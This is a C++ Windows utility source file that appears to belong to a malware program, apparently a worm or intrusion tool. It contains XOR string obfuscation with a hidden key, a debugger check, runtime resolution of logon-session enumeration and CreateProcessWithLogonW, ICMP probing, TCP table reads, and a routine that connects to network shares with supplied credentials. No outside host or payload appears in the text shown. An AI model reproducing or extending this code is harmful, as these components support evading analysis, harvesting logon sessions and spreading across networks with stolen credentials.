#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>

#include "util.h"

using namespace std;

class DecodeString{
	char *unEncStr;
	int unEncStrLen;

	BYTE ByteDecode(BYTE byte){
		int i;
		for(i=0; i<=sizeof(DWORD)-1; i++)
			byte ^= (BYTE)((ENC_DEC_KEY_STRING >> (i*8)) & 0xFF);
		return byte;
	}

public:
	LPSTR getDecodeString(LPSTR lpEncString){
		string tmpStr;
		int i;
		char byte;

		//MessageBox(0, "getDecodeString", 0, 0);

		if(this->unEncStr){
			delete[] this->unEncStr;
			this->unEncStr=NULL;
			this->unEncStrLen = 0;
		}

		if(!lpEncString) return NULL;
			
		for(i=0;;i++){
			byte = (char)this->ByteDecode(lpEncString[i]);
			if(!byte) break;
			tmpStr.append(1, byte);
		}

		if(tmpStr.length()){
			this->unEncStrLen = tmpStr.length();
			this->unEncStr = new CHAR[tmpStr.length()+2];
			if(!this->unEncStr){ 
				this->unEncStrLen = 0;	
				return NULL;
			}

			memset(this->unEncStr, 0, tmpStr.length()+2);
			strcpy(this->unEncStr, tmpStr.c_str());
			//MessageBox(0, this->unEncStr, NULL, NULL);
		}

		/*if(tmpStr.length())
			tmpStr.erase(0, tmpStr.length());*/
		return this->unEncStr;
	}

	int length(void){
		/*if(this->unEncStr)
			return strlen(this->unEncStr);*/
		//MessageBox(0, "length", 0, 0);
		return this->unEncStrLen;
	}

	DecodeString(void){
		this->unEncStr = NULL;
		this->unEncStrLen = 0;
	}

	~DecodeString(void){
		//cout << "From destructor!!" << endl;
		if(this->unEncStr){
			delete[] this->unEncStr;
			this->unEncStr = NULL;
		}
	}
};


BOOL WaitAndCheckUnloadMutex(DWORD dwInterval, DWORD dwSleepTime){
	HANDLE hMutex;
	int i;
	DecodeString ds;

	for(i=0; i<=(int)dwInterval-1; i++){
		if((hMutex = OpenMutex(SYNCHRONIZE, FALSE, ds.getDecodeString((LPSTR)UNLOAD_MUTEX)))){
			CloseHandle(hMutex);
			return TRUE;
		}

		Sleep(dwSleepTime);
	}
	return FALSE;
}

BOOL GetFunctionsEntryPoint(void){
	if(!(LsaEnumerateLogonSessions = (lpLsaEnumerateLogonSessions)GetProcAddress(LoadLibrary("Secur32.dll"), "LsaEnumerateLogonSessions")))
		return FALSE;

	if(!(LsaGetLogonSessionData = (lpLsaGetLogonSessionData)GetProcAddress(LoadLibrary("Secur32.dll"), "LsaGetLogonSessionData")))
		return FALSE;

	if(!(GetModuleFileNameEx = (lpGetModuleFileNameEx)GetProcAddress(LoadLibrary("Psapi.dll"), "GetModuleFileNameExA")))
		return FALSE;

	if(!(IsDebuggerPresent = (lpfIsDebuggerPresent)GetProcAddress(LoadLibrary("Kernel32.dll"), 
		"IsDebuggerPresent")))
		return FALSE;

	if(!(IcmpCreateFile = (lpfIcmpCreateFile)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpCreateFile")))
		return FALSE;

	if(!(IcmpSendEcho = (lpfIcmpSendEcho)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpSendEcho")))
		return FALSE;

	if(!(IcmpCloseHandle = (lpfIcmpCloseHandle)GetProcAddress(LoadLibrary("Iphlpapi.dll"), "IcmpCloseHandle")))
		return FALSE;

	if(!(HashData = (lpfHashData)GetProcAddress(LoadLibrary("shlwapi.dll"), "HashData")))
		return FALSE;

	if(!(GetTcpTable = (lpfGetTcpTable)GetProcAddress(LoadLibrary("iphlpapi.dll"), "GetTcpTable")))
		return FALSE;

	if(!(CreateProcessWithLogonW = (lpfCreateProcessWithLogonW)GetProcAddress(LoadLibrary("Advapi32.dll"), "CreateProcessWithLogonW")))
		return FALSE;

	if(!(ConvertStringSecurityDescriptorToSecurityDescriptor = 
		(lpfConvertStringSecurityDescriptorToSecurityDescriptor) 
		GetProcAddress(LoadLibrary("Advapi32.dll"), "ConvertStringSecurityDescriptorToSecurityDescriptorA")))
		return FALSE;

	return TRUE;
}

DWORD GetServiceState(LPSTR lpName){
	SC_HANDLE ScHandle=NULL, hService=NULL;
	DWORD dwRetVal=NULL;
	SERVICE_STATUS ServiceStatus = {0};

	if(!lpName)
		return -1;
	
	if(!(ScHandle = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, GENERIC_READ))){
		return -1;
	}

	if(!(hService = OpenService(ScHandle, lpName, SERVICE_QUERY_STATUS))){
		dwRetVal = -1;
		goto Cleanup;
	}

	if(!QueryServiceStatus(hService, &ServiceStatus)){
		dwRetVal = -1;
		goto Cleanup;
	}

	dwRetVal = ServiceStatus.dwCurrentState;
Cleanup:
	if(ScHandle)
		CloseServiceHandle(ScHandle);

	if(hService)
		CloseServiceHandle(hService);

	return dwRetVal;
}

BOOL MakeConnectionToNetworkResource(LPSTR lpRemoteName, LPSTR lpUser, LPSTR lpPassword){
	NETRESOURCE netResource={0};

	if(!lpRemoteName)
		return FALSE;

	netResource.lpRemoteName = lpRemoteName;
	
	if(WNetAddConnection2(&netResource, lpPassword, lpUser, NULL) != NO_ERROR)
		return FALSE;

	return TRUE;
}

BOOL TerminateConnectionToNetworkResource(LPSTR lpName){
	if(WNetCancelConnection2(lpName, NULL, TRUE) != NO_ERROR)
		return FALSE;

	return TRUE;
}